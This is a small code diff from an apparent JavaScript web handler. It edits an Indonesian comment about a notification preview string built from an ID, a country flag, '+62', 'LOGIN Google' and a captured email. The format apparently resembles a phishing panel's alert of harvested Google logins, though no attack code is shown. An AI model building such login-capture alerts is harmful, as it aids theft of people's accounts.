@@ -50,7 +50,7 @@ export default async function handler(req, res) {
 
         const flag = countryFlag(d.negaraKode || "");
 
-        // Preview text = ID + bendera + IP + EMAIL
+        // Preview = ID + bendera + EMAIL
         const previewText = "ID " + flag + " | +62 | LOGIN Google | EMAIL " + (d.email || "-");
 
         const htmlBody = `
